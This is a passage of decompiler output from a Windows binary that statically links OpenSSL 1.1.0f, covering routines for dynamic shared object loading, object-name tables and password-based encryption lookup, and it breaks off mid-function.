//----- (0000000140035230) ----------------------------------------------------
_QWORD *__fastcall sub_140035230(__int64 a1, int a2)
{
  _QWORD *v4; // rsi
  int v5; // eax
  unsigned int v6; // edi
  _BYTE *v8; // rax
  _BYTE *v9; // rbx

  v4 = 0i64;
  v5 = sub_140035710(a1, 0i64, 0);
  v6 = v5;
  if ( v5 < 0 )
    return 0i64;
  v8 = sub_14001D8E0(v5);
  v9 = v8;
  if ( v8 )
  {
    if ( (unsigned int)sub_140035710(a1, (__int64)v8, v6) == v6 )
      v4 = sub_140035410(0i64, v9, 0i64, a2);
  }
  sub_14001D930(v9);
  return v4;
}

//----- (00000001400352F0) ----------------------------------------------------
__int64 __fastcall sub_1400352F0(void *a1)
{
  unsigned int (__fastcall *v2)(void *); // rdx
  unsigned int (__fastcall *v4)(void *); // rdx
  int v5; // [rsp+40h] [rbp+8h] BYREF

  if ( a1 )
  {
    if ( (int)sub_140025D60((_DWORD *)a1 + 4, -1, &v5) <= 0 )
      return 0i64;
    if ( v5 <= 0 )
    {
      if ( (*((_BYTE *)a1 + 20) & 4) == 0 )
      {
        v2 = *(unsigned int (__fastcall **)(void *))(*(_QWORD *)a1 + 16i64);
        if ( v2 )
        {
          if ( !v2(a1) )
          {
            sub_140024610(37, 111, 107, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 78);
            return 0i64;
          }
        }
      }
      v4 = *(unsigned int (__fastcall **)(void *))(*(_QWORD *)a1 + 64i64);
      if ( v4 && !v4(a1) )
      {
        sub_140024610(37, 111, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 84);
        return 0i64;
      }
      sub_1400294B0(*((void ***)a1 + 1));
      sub_14001D930(*((void **)a1 + 6));
      sub_14001D930(*((void **)a1 + 7));
      sub_140025BE0(*((_DWORD **)a1 + 8));
      sub_14001D930(a1);
    }
  }
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140035410) ----------------------------------------------------
_QWORD *__fastcall sub_140035410(_QWORD *a1, _BYTE *a2, __int64 a3, int a4)
{
  int v4; // esi
  _QWORD *v7; // rbx
  _QWORD *v8; // rax
  int v10; // r8d
  unsigned int (__fastcall *v11)(_QWORD *); // rdx
  int v12; // [rsp+20h] [rbp-18h]

  v4 = 0;
  v7 = a1;
  if ( !a1 )
  {
    v8 = sub_1400355E0();
    v7 = v8;
    if ( !v8 )
    {
      sub_140024610(37, 112, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 126);
      return 0i64;
    }
    v4 = 1;
    *((_DWORD *)v8 + 5) = a4;
  }
  if ( v7[6] )
  {
    v12 = 139;
    v10 = 110;
LABEL_16:
    sub_140024610(37, 112, v10, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", v12);
    goto LABEL_17;
  }
  if ( !a2 || (unsigned int)sub_1400357A0((__int64)v7, a2) )
  {
    if ( v7[6] )
    {
      v11 = *(unsigned int (__fastcall **)(_QWORD *))(*v7 + 8i64);
      if ( v11 )
      {
        if ( v11(v7) )
          return v7;
        v12 = 161;
        v10 = 103;
      }
      else
      {
        v12 = 157;
        v10 = 108;
      }
    }
    else
    {
      v12 = 153;
      v10 = 111;
    }
    goto LABEL_16;
  }
  sub_140024610(37, 112, 112, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 148);
LABEL_17:
  if ( v4 )
    sub_1400352F0(v7);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140035540) ----------------------------------------------------
__int64 __fastcall sub_140035540(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r9
  __int64 (__fastcall *v4)(__int64, __int64, __int64, _QWORD); // rax
  __int64 (__fastcall *v6)(__int64, __int64, __int64, _QWORD); // r10

  v3 = 0i64;
  if ( a1 && a2 )
  {
    if ( (*(_BYTE *)(a1 + 20) & 1) == 0 )
    {
      v4 = *(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD))(a1 + 40);
      if ( v4 )
        return v4(a1, a2, a3, 0i64);
      v6 = *(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD))(*(_QWORD *)a1 + 48i64);
      if ( v6 )
        return v6(a1, a2, a3, 0i64);
    }
    return v3;
  }
  else
  {
    sub_140024610(37, 132, 67, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 267);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400355C0) ----------------------------------------------------
void *sub_1400355C0()
{
  return sub_1400355E0();
}

//----- (00000001400355E0) ----------------------------------------------------
void *sub_1400355E0()
{
  void *v0; // rbx
  _QWORD *v2; // rax
  _DWORD *v3; // rax
  unsigned int (__fastcall *v4)(void *); // rdx

  if ( !qword_140142C40 )
    qword_140142C40 = (__int64)sub_140061CD0();
  v0 = sub_14001DC20(0x48ui64);
  if ( !v0 )
  {
    sub_140024610(37, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 28);
    return 0i64;
  }
  v2 = sub_1400296C0();
  *((_QWORD *)v0 + 1) = v2;
  if ( !v2 )
  {
    sub_140024610(37, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 34);
LABEL_7:
    sub_14001D930(v0);
    return 0i64;
  }
  *(_QWORD *)v0 = qword_140142C40;
  *((_DWORD *)v0 + 4) = 1;
  v3 = sub_140025C10();
  *((_QWORD *)v0 + 8) = v3;
  if ( !v3 )
  {
    sub_140024610(37, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 42);
    sub_1400294B0(*((void ***)v0 + 1));
    goto LABEL_7;
  }
  v4 = *(unsigned int (__fastcall **)(void *))(*(_QWORD *)v0 + 56i64);
  if ( v4 )
  {
    if ( !v4(v0) )
    {
      sub_1400352F0(v0);
      return 0i64;
    }
  }
  return v0;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C40: using guessed type __int64 qword_140142C40;

//----- (0000000140035710) ----------------------------------------------------
__int64 __fastcall sub_140035710(__int64 a1, __int64 a2, unsigned int a3)
{
  char **v3; // rax
  char *v7; // r9

  v3 = (char **)qword_140142C40;
  if ( !qword_140142C40 )
    v3 = sub_140061CD0();
  v7 = v3[9];
  if ( v7 )
    return ((__int64 (__fastcall *)(__int64, __int64, _QWORD))v7)(a1, a2, a3);
  sub_140024610(37, 105, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 315);
  return 0xFFFFFFFFi64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C40: using guessed type __int64 qword_140142C40;

//----- (00000001400357A0) ----------------------------------------------------
__int64 __fastcall sub_1400357A0(__int64 a1, _BYTE *a2)
{
  void *v4; // rdi

  if ( a1 && a2 )
  {
    if ( *(_QWORD *)(a1 + 56) )
    {
      sub_140024610(37, 129, 110, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 248);
      return 0i64;
    }
    else
    {
      v4 = sub_14003BB60(a2);
      if ( v4 )
      {
        sub_14001D930(*(void **)(a1 + 48));
        *(_QWORD *)(a1 + 48) = v4;
        return 1i64;
      }
      else
      {
        sub_140024610(37, 129, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 254);
        return 0i64;
      }
    }
  }
  else
  {
    sub_140024610(37, 129, 67, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dso\\dso_lib.c", 244);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400358A0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400358A0(__int64 a1, int a2, __int64 a3)
{
  _BOOL8 result; // rax
  _DWORD *v7; // rax
  void *v8; // rbx
  __int64 v9; // rcx
  _QWORD *v10; // rdi
  __int64 v11; // rax

  if ( qword_140142C48 || (result = sub_140035B40()) )
  {
    v7 = sub_14001D8E0(0x18ui64);
    v8 = v7;
    if ( v7 )
    {
      v9 = qword_140142C48;
      *((_QWORD *)v7 + 1) = a1;
      *((_QWORD *)v7 + 2) = a3;
      v7[1] = a2 & 0x8000;
      *v7 = a2 & 0xFFFF7FFF;
      v10 = sub_14003ED50(v9, (__int64)v7);
      if ( v10 )
      {
        if ( qword_140142C50 )
        {
          if ( (int)sub_1400296E0((unsigned int *)qword_140142C50) > *(_DWORD *)v10 )
          {
            v11 = sub_140029880(qword_140142C50, *(_DWORD *)v10);
            (*(void (__fastcall **)(_QWORD, _QWORD, _QWORD))(v11 + 16))(v10[1], *(unsigned int *)v10, v10[2]);
          }
        }
        sub_14001D930(v10);
        return 1i64;
      }
      if ( !(unsigned int)sub_140024D30(qword_140142C48) )
        return 1i64;
      sub_14001D930(v8);
    }
    return 0i64;
  }
  return result;
}
// 140142C48: using guessed type __int64 qword_140142C48;
// 140142C50: using guessed type __int64 qword_140142C50;

//----- (00000001400359D0) ----------------------------------------------------
void __fastcall sub_1400359D0(int a1)
{
  int v2; // edi

  if ( qword_140142C48 )
  {
    dword_140142C58 = a1;
    v2 = sub_14003ED40(qword_140142C48);
    sub_14003F010(qword_140142C48, 0);
    sub_14003EBA0(qword_140142C48, sub_140035C80);
    if ( a1 >= 0 )
    {
      sub_14003F010(qword_140142C48, v2);
    }
    else
    {
      sub_14003ECA0(qword_140142C48);
      sub_140029720((void *)qword_140142C50, (void (*)(void))sub_140035C50);
      qword_140142C48 = 0i64;
      qword_140142C50 = 0i64;
    }
  }
}
// 140142C48: using guessed type __int64 qword_140142C48;
// 140142C50: using guessed type __int64 qword_140142C50;
// 140142C58: using guessed type int dword_140142C58;

//----- (0000000140035A70) ----------------------------------------------------
__int64 __fastcall sub_140035A70(__int64 a1, int a2)
{
  int v2; // ebx
  __int64 v6; // rcx
  _QWORD *v7; // rax
  unsigned int v8; // [rsp+20h] [rbp-28h] BYREF
  __int64 v9; // [rsp+28h] [rbp-20h]

  v2 = 0;
  if ( !a1 )
    return 0i64;
  v6 = qword_140142C48;
  if ( !qword_140142C48 )
  {
    if ( !sub_140035B40() )
      return 0i64;
    v6 = qword_140142C48;
  }
  v9 = a1;
  v8 = a2 & 0xFFFF7FFF;
  v7 = sub_14003EF50(v6, (__int64)&v8);
  if ( !v7 )
    return 0i64;
  while ( *((_DWORD *)v7 + 1) && (a2 & 0x8000) == 0 )
  {
    if ( ++v2 <= 10 )
    {
      v9 = v7[2];
      v7 = sub_14003EF50(qword_140142C48, (__int64)&v8);
      if ( v7 )
        continue;
    }
    return 0i64;
  }
  return v7[2];
}
// 140142C48: using guessed type __int64 qword_140142C48;

//----- (0000000140035B40) ----------------------------------------------------
_BOOL8 sub_140035B40()
{
  if ( qword_140142C48 )
    return 1i64;
  UserMathErrorFunction((struct _exception *)3);
  qword_140142C48 = (__int64)sub_14003EE70(
                               (__int64 (__fastcall *)(char *))sub_140035D40,
                               (int (__cdecl *)(const char *, const char *))sub_140035CB0);
  UserMathErrorFunction((struct _exception *)2);
  return qword_140142C48 != 0;
}
// 140142C48: using guessed type __int64 qword_140142C48;

//----- (0000000140035BA0) ----------------------------------------------------
__int64 __fastcall sub_140035BA0(__int64 a1, int a2)
{
  __int64 result; // rax
  int *v3; // rbx
  __int64 v4; // rax
  unsigned int v5; // [rsp+20h] [rbp-28h] BYREF
  __int64 v6; // [rsp+28h] [rbp-20h]

  if ( !qword_140142C48 )
    return 0i64;
  v5 = a2 & 0xFFFF7FFF;
  v6 = a1;
  result = sub_14003EAA0(qword_140142C48, (__int64)&v5);
  v3 = (int *)result;
  if ( result )
  {
    if ( qword_140142C50 )
    {
      if ( (int)sub_1400296E0((unsigned int *)qword_140142C50) > *(_DWORD *)result )
      {
        v4 = sub_140029880(qword_140142C50, *v3);
        (*(void (__fastcall **)(_QWORD, _QWORD, _QWORD))(v4 + 16))(
          *((_QWORD *)v3 + 1),
          (unsigned int)*v3,
          *((_QWORD *)v3 + 2));
      }
    }
    sub_14001D930(v3);
    return 1i64;
  }
  return result;
}
// 140142C48: using guessed type __int64 qword_140142C48;
// 140142C50: using guessed type __int64 qword_140142C50;

//----- (0000000140035C50) ----------------------------------------------------
void __fastcall sub_140035C50(void *a1)
{
  sub_14001D930(a1);
}

//----- (0000000140035C80) ----------------------------------------------------
void __fastcall sub_140035C80(__int64 a1)
{
  if ( a1 && (dword_140142C58 < 0 || dword_140142C58 == *(_DWORD *)a1) )
    sub_140035BA0(*(_QWORD *)(a1 + 8), *(_DWORD *)a1);
}
// 140142C58: using guessed type int dword_140142C58;

//----- (0000000140035CB0) ----------------------------------------------------
__int64 __fastcall sub_140035CB0(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v5; // rax
  unsigned __int8 *v6; // rax
  __int64 v7; // rdx
  unsigned __int8 v8; // cl

  result = (unsigned int)(*(_DWORD *)a1 - *(_DWORD *)a2);
  if ( *(_DWORD *)a1 == *(_DWORD *)a2 )
  {
    if ( qword_140142C50 && (int)sub_1400296E0((unsigned int *)qword_140142C50) > *(_DWORD *)a1 )
    {
      v5 = sub_140029880(qword_140142C50, *(_DWORD *)a1);
      return (*(__int64 (__fastcall **)(_QWORD, _QWORD))(v5 + 8))(*(_QWORD *)(a1 + 8), *(_QWORD *)(a2 + 8));
    }
    else
    {
      v6 = *(unsigned __int8 **)(a1 + 8);
      v7 = *(_QWORD *)(a2 + 8) - (_QWORD)v6;
      while ( 1 )
      {
        v8 = *v6;
        if ( *v6 != v6[v7] )
          break;
        ++v6;
        if ( !v8 )
          return 0i64;
      }
      return v8 < v6[v7] ? -1 : 1;
    }
  }
  return result;
}
// 140142C50: using guessed type __int64 qword_140142C50;

//----- (0000000140035D40) ----------------------------------------------------
__int64 __fastcall sub_140035D40(__int64 a1)
{
  unsigned int (__fastcall **v2)(_QWORD); // rax

  if ( !qword_140142C50 || (int)sub_1400296E0((unsigned int *)qword_140142C50) <= *(_DWORD *)a1 )
    return (unsigned int)sub_14003F020(*(char **)(a1 + 8)) ^ *(_DWORD *)a1;
  v2 = (unsigned int (__fastcall **)(_QWORD))sub_140029880(qword_140142C50, *(_DWORD *)a1);
  return (*v2)(*(_QWORD *)(a1 + 8)) ^ *(_DWORD *)a1;
}
// 140142C50: using guessed type __int64 qword_140142C50;

//----- (0000000140035DA0) ----------------------------------------------------
__int64 __fastcall sub_140035DA0(int a1, _DWORD *a2, _DWORD *a3)
{
  int v5; // eax
  __int64 v6; // rcx
  __int64 result; // rax
  int v8[4]; // [rsp+30h] [rbp-28h] BYREF

  v8[0] = a1;
  if ( qword_140142C60
    && (v5 = sub_140029490((int *)qword_140142C60, (__int64)v8), v5 >= 0)
    && (v6 = sub_140029880(qword_140142C60, v5)) != 0
    || (result = sub_14002BCB0(
                   (__int64)v8,
                   (__int64)"\a",
                   42,
                   12,
                   (__int64 (__fastcall *)(__int64, __int64))sub_140024C80),
        (v6 = result) != 0) )
  {
    if ( a2 )
      *a2 = *(_DWORD *)(v6 + 4);
    if ( a3 )
      *a3 = *(_DWORD *)(v6 + 8);
    return 1i64;
  }
  return result;
}
// 140142C60: using guessed type __int64 qword_140142C60;

//----- (0000000140035E60) ----------------------------------------------------
__int64 __fastcall sub_140035E60(_DWORD *a1, int a2, int a3)
{
  int v4; // eax
  __int64 result; // rax
  char *v6; // [rsp+30h] [rbp-28h] BYREF
  char v7[4]; // [rsp+38h] [rbp-20h] BYREF
  int v8; // [rsp+3Ch] [rbp-1Ch]
  int v9; // [rsp+40h] [rbp-18h]

  v8 = a2;
  v6 = v7;
  v9 = a3;
  if ( qword_140142C68 && (v4 = sub_140029490((int *)qword_140142C68, (__int64)v7), v4 >= 0) )
  {
    v6 = (char *)sub_140029880(qword_140142C68, v4);
    result = (__int64)&v6;
  }
  else
  {
    result = sub_14002BCB0((__int64)&v6, (__int64)&off_1400F51E0, 39, 8, sub_140035FB0);
    if ( !result )
      return result;
  }
  if ( a1 )
    *a1 = **(_DWORD **)result;
  return 1i64;
}
// 1400F51E0: using guessed type char *off_1400F51E0;
// 140142C68: using guessed type __int64 qword_140142C68;

//----- (0000000140035F30) ----------------------------------------------------
void sub_140035F30()
{
  sub_140029720((void *)qword_140142C60, (void (*)(void))sub_140035F80);
  qword_140142C60 = 0i64;
  sub_1400294B0((void **)qword_140142C68);
  qword_140142C68 = 0i64;
}
// 140142C60: using guessed type __int64 qword_140142C60;
// 140142C68: using guessed type __int64 qword_140142C68;

//----- (0000000140035F80) ----------------------------------------------------
void __fastcall sub_140035F80(void *a1)
{
  sub_14001D930(a1);
}

//----- (0000000140035FB0) ----------------------------------------------------
__int64 __fastcall sub_140035FB0(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = (unsigned int)(*(_DWORD *)(*(_QWORD *)a1 + 4i64) - *(_DWORD *)(*(_QWORD *)a2 + 4i64));
  if ( !(_DWORD)result )
    return (unsigned int)(*(_DWORD *)(*(_QWORD *)a1 + 8i64) - *(_DWORD *)(*(_QWORD *)a2 + 8i64));
  return result;
}

//----- (0000000140035FD0) ----------------------------------------------------
__int64 __fastcall sub_140035FD0(__int64 a1, _BYTE *a2, unsigned int a3, __int64 a4, __int64 a5, int a6)
{
  int v10; // eax
  __int64 v11; // rdi
  int v12; // eax
  __int64 v13; // rax
  unsigned int v14; // ecx
  unsigned int v15; // r14d
  unsigned int (__fastcall *v16)(__int64, _BYTE *, _QWORD, __int64, __int64, __int64, int); // r15
  unsigned int v17; // ebx
  _BYTE *i; // rax
  __int64 v19; // rsi
  char *v20; // rax
  char *v22; // rax
  int v23[8]; // [rsp+40h] [rbp-C8h] BYREF
  char v24[80]; // [rsp+60h] [rbp-A8h] BYREF

  v10 = sub_14002C260(a1);
  if ( v10 )
  {
    if ( (v11 = 0i64, v23[0] = 0, v23[1] = v10, qword_140142C70)
      && (v12 = sub_140029490((int *)qword_140142C70, (__int64)v23), v12 != -1)
      && (v13 = sub_140029880(qword_140142C70, v12)) != 0
      || (v13 = sub_14002BCB0(
                  (__int64)v23,
                  (__int64)&unk_1400F5350,
                  25,
                  24,
                  (__int64 (__fastcall *)(__int64, __int64))sub_140036370)) != 0 )
    {
      v14 = *(_DWORD *)(v13 + 8);
      v15 = *(_DWORD *)(v13 + 12);
      v16 = *(unsigned int (__fastcall **)(__int64, _BYTE *, _QWORD, __int64, __int64, __int64, int))(v13 + 16);
      if ( a2 )
      {
        if ( a3 == -1 )
        {
          v17 = 0;
          for ( i = a2; *i; ++v17 )
          {
            if ( v17 >= 0x80000000 )
              break;
            ++i;
          }
          a3 = v17 & 0x7FFFFFFF;
        }
      }
      else
      {
        a3 = 0;
      }
      if ( v14 == -1 )
      {
        v19 = 0i64;
      }
      else
      {
        v22 = sub_14002C1A0(v14);
        v19 = sub_14001E950((__int64)v22);
        if ( !v19 )
        {
          sub_140024610(6, 116, 160, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_pbe.c", 110);
          return 0i64;
        }
      }
      if ( v15 == -1 || (v20 = sub_14002C1A0(v15), (v11 = sub_14001E990((__int64)v20)) != 0) )
      {
        if ( v16(a5, a2, a3, a4, v19, v11, a6) )
          return 1i64;
        sub_140024610(6, 116, 120, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_pbe.c", 126);
      }
      else
      {
        sub_140024610(6, 116, 161, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_pbe.c", 120);
      }
      return 0i64;
    }
  }
  sub_140024610(6, 116, 121, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_pbe.c", 91);
  if ( a1 )
    sub_14003FE60(v24, 80, a1);
  else
    sub_14003C060(v24, "NULL", 0x50ui64);
  sub_140023A40(2, "TYPE=", v24);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C70: using guessed type __int64 qword_140142C70;

//----- (0000000140036240) ----------------------------------------------------
void sub_140036240()
{
  sub_140029720((void *)qword_140142C70, (void (*)(void))sub_140036340);
  qword_140142C70 = 0i64;
}
// 140142C70: using guessed type __int64 qword_140142C70;

//----- (0000000140036270) ----------------------------------------------------
__int64 __fastcall sub_140036270(int a1, int a2, _DWORD *a3, _DWORD *a4, _QWORD *a5)
{
  int v8; // eax
  __int64 v9; // rcx
  int v10[10]; // [rsp+30h] [rbp-28h] BYREF

  if ( !a2 )
    return 0i64;
  v10[0] = a1;
  v10[1] = a2;
  if ( !qword_140142C70
    || (v8 = sub_140029490((int *)qword_140142C70, (__int64)v10), v8 == -1)
    || (v9 = sub_140029880(qword_140142C70, v8)) == 0 )
  {
    v9 = sub_14002BCB0(
           (__int64)v10,
           (__int64)&unk_1400F5350,
           25,
           24,
           (__int64 (__fastcall *)(__int64, __int64))sub_140036370);
    if ( !v9 )
      return 0i64;
  }
  if ( a3 )
    *a3 = *(_DWORD *)(v9 + 8);
  if ( a4 )
    *a4 = *(_DWORD *)(v9 + 12);
  if ( a5 )
    *a5 = *(_QWORD *)(v9 + 16);
  return 1i64;
}
// 140142C70: using guessed type __int64 qword_140142C70;

//----- (0000000140036340) ----------------------------------------------------
void __fastcall sub_140036340(void *a1)
{
  sub_14001D930(a1);
}

//----- (0000000140036370) ----------------------------------------------------
__int64 __fastcall sub_140036370(_DWORD *a1, _DWORD *a2)
{
  __int64 result; // rax

  result = (unsigned int)(*a1 - *a2);
  if ( *a1 == *a2 )
    return (unsigned int)(a1[1] - a2[1]);
  return result;
}

//----- (0000000140036380) ----------------------------------------------------
__int64 __fastcall sub_140036380(__int64 a1)
{
  __int64 result; // rax

  result = (__int64)sub_140062DE0();
  *(_QWORD *)(a1 + 40) = result;
  if ( result )
  {
    *(_DWORD *)(a1 + 72) = 0;
    return 1i64;
  }
  return result;
}

//----- (00000001400363C0) ----------------------------------------------------
_DWORD *__fastcall sub_1400363C0(__int64 a1, __int64 a2)
{
  _DWORD *result; // rax

  result = sub_140062DE0();
  *(_QWORD *)(a1 + 40) = result;
  if ( result )
  {
    *(_DWORD *)(a1 + 72) = 0;
    return (_DWORD *)((unsigned int)sub_140062CF0((__int64)result, *(_QWORD *)(a2 + 40)) != 0);
  }
  return result;
}

//----- (0000000140036420) ----------------------------------------------------
void __fastcall sub_140036420(__int64 a1)
{
  sub_140062DA0(*(void ***)(a1 + 40));
}

//----- (0000000140036440) ----------------------------------------------------
__int64 __fastcall sub_140036440(__int64 a1, __int64 a2)
{
  void **v4; // rax
  void **v5; // rdi

  v4 = (void **)sub_140062DE0();
  v5 = v4;
  if ( !v4 )
    return 0i64;
  if ( !(unsigned int)sub_140062CF0((__int64)v4, *(_QWORD *)(a1 + 40)) )
  {
    sub_140062DA0(v5);
    return 0i64;
  }
  sub_14001D1A0(a2, 894, (__int64)v5);
  return 1i64;
}

//----- (00000001400364C0) ----------------------------------------------------
__int64 __fastcall sub_1400364C0(__int64 a1, struct std::ios_base *a2)
{
  sub_1400252B0((__int64)a2, 256);
  std::swfun(a2, (__int64)sub_1400366C0);
  return 1i64;
}

//----- (0000000140036500) ----------------------------------------------------
__int64 __fastcall sub_140036500(__int64 a1, __int64 a2, _QWORD *a3)
{
  return sub_140062E50(*(_QWORD *)(a1 + 40), a2, a3);
}

//----- (0000000140036520) ----------------------------------------------------
__int64 __fastcall sub_140036520(__int64 *a1, int a2, __int64 a3, int *a4)
{
  _DWORD **v4; // rbx
  int v5; // edx
  int v6; // edx
  int v8; // eax
  __int64 v9; // rdx
  __int64 v10; // rdx

  v4 = (_DWORD **)a1[5];
  v5 = a2 - 1;
  if ( !v5 )
  {
    v10 = a1[2];
    if ( v10 && !(unsigned int)sub_140062CF0(a1[5], *(_QWORD *)(v10 + 32)) )
      return 0i64;
    a3 = 0i64;
    v9 = 0i64;
LABEL_9:
    v8 = sub_140062F80(v4, v9, a3, 0i64, 0i64);
    return v8 != 0;
  }
  v6 = v5 - 5;
  if ( !v6 )
  {
    if ( !a4 || (int)a3 < 0 )
      return 0i64;
    a3 = (int)a3;
    v9 = (__int64)a4;
    goto LABEL_9;
  }
  if ( v6 != 6 )
    return 4294967294i64;
  v8 = sub_140062F80(v4, 0i64, 0i64, a4, a1[1]);
  return v8 != 0;
}

//----- (00000001400365C0) ----------------------------------------------------
__int64 __fastcall sub_1400365C0(__int64 a1, __int64 a2, char *a3)
{
  __int64 result; // rax
  __int64 v5; // rbx
  __int64 v6; // rcx
  char v7; // al
  __int64 v8; // rcx
  char v9; // al
  char v10; // al

  if ( !a3 )
    return 0i64;
  v5 = 0i64;
  v6 = 0i64;
  while ( 1 )
  {
    v7 = *(_BYTE *)(a2 + v6++);
    if ( v7 != aCipher[v6 - 1] )
      break;
    if ( v6 == 7 )
    {
      result = sub_14001E950((__int64)a3);
      if ( result )
      {
        LOBYTE(v5) = (unsigned int)sub_140062F80(*(_DWORD ***)(a1 + 40), 0i64, 0i64, (int *)result, *(_QWORD *)(a1 + 8)) != 0;
        return (unsigned int)v5;
      }
      return result;
    }
  }
  v8 = 0i64;
  while ( 1 )
  {
    v9 = *(_BYTE *)(a2 + v8++);
    if ( v9 != aKey[v8 - 1] )
      break;
    if ( v8 == 4 )
      return sub_1400207C0(a1, 6i64, a3);
  }
  while ( 1 )
  {
    v10 = *(_BYTE *)(a2 + v5++);
    if ( v10 != aHexkey[v5 - 1] )
      break;
    if ( v5 == 7 )
      return (__int64)sub_1400206E0(a1, 6u, a3);
  }
  return 4294967294i64;
}

//----- (00000001400366C0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400366C0(std::ios_base *a1, char *a2, size_t a3)
{
  __int64 v5; // rax

  v5 = std::ios_base::precision(a1);
  return (unsigned int)sub_140063120(*(_QWORD *)(v5 + 40), a2, a3) != 0;
}

//----- (0000000140036710) ----------------------------------------------------
__int64 __fastcall sub_140036710(__int64 a1)
{
  int v1; // eax
  __int64 result; // rax

  result = (__int64)sub_14001DC20((unsigned int)(v1 + 48));
  if ( result )
  {
    *(_DWORD *)result = 1024;
    *(_DWORD *)(result + 12) = -1;
    *(_DWORD *)(result + 4) = 2;
    *(_BYTE *)(result + 36) = 1;
    *(_QWORD *)(a1 + 40) = result;
    *(_QWORD *)(a1 + 64) = result + 28;
    result = 1i64;
    *(_DWORD *)(a1 + 72) = 2;
  }
  return result;
}
// 140036726: variable 'v1' is possibly undefined

//----- (0000000140036780) ----------------------------------------------------
void __fastcall sub_140036780(__int64 a1)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 40);
  if ( v1 )
  {
    sub_14001D930(*(void **)(v1 + 56));
    sub_14003F4D0(*(_QWORD *)(v1 + 40));
    sub_14001D930((void *)v1);
  }
}

//----- (00000001400367E0) ----------------------------------------------------
__int64 __fastcall sub_1400367E0(__int64 a1, __int64 a2)
{
  __int64 v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rax
  const void *v8; // rcx
  void *v9; // rax

  if ( !(unsigned int)sub_140036710(a1) )
    return 0i64;
  v5 = *(_QWORD *)(a2 + 40);
  v6 = *(_QWORD *)(a1 + 40);
  *(_DWORD *)v6 = *(_DWORD *)v5;
  *(_DWORD *)(v6 + 12) = *(_DWORD *)(v5 + 12);
  *(_DWORD *)(v6 + 4) = *(_DWORD *)(v5 + 4);
  *(_DWORD *)(v6 + 8) = *(_DWORD *)(v5 + 8);
  *(_QWORD *)(v6 + 16) = *(_QWORD *)(v5 + 16);
  *(_DWORD *)(v6 + 24) = *(_DWORD *)(v5 + 24);
  *(_BYTE *)(v6 + 36) = *(_BYTE *)(v5 + 36);
  v7 = sub_140047B90(*(_QWORD *)(v5 + 40));
  *(_QWORD *)(v6 + 40) = v7;
  if ( !v7 )
    return 0i64;
  *(_QWORD *)(v6 + 48) = *(_QWORD *)(v5 + 48);
  v8 = *(const void **)(v5 + 56);
  if ( v8 )
  {
    v9 = sub_14003BAB0(v8, *(_QWORD *)(v5 + 64));
    *(_QWORD *)(v6 + 56) = v9;
    if ( v9 )
    {
      *(_QWORD *)(v6 + 64) = *(_QWORD *)(v5 + 64);
      goto LABEL_7;
    }
    return 0i64;
  }
LABEL_7:
  *(_QWORD *)(v6 + 72) = *(_QWORD *)(v5 + 72);
  return 1i64;
}

//----- (00000001400368B0) ----------------------------------------------------
__int64 __fastcall sub_1400368B0(__int64 a1, int a2, int a3, _QWORD *a4)
{
  __int64 v4; // rbx
  __int64 v6; // rdi
  __int64 result; // rax

  v4 = *(_QWORD *)(a1 + 40);
  v6 = a3;
  if ( a2 > 4097 )
  {
    switch ( a2 )
    {
      case 4098:
        if ( *(_DWORD *)(v4 + 8) )
          return 4294967294i64;
        *(_DWORD *)(v4 + 4) = a3;
        return 1i64;
      case 4099:
        if ( (unsigned int)(a3 - 1) > 2 )
          return 4294967294i64;
        *(_DWORD *)(v4 + 24) = a3;
        return 1i64;
      case 4100:
        if ( !*(_DWORD *)(v4 + 8) )
          return 4294967294i64;
        *(_DWORD *)(v4 + 12) = a3;
        return 1i64;
      case 4101:
        if ( (unsigned int)a3 > 2 )
          return 4294967294i64;
        *(_DWORD *)(v4 + 8) = a3;
        return 1i64;
      case 4102:
        if ( a3 == -2 )
          return (unsigned int)*(char *)(v4 + 36);
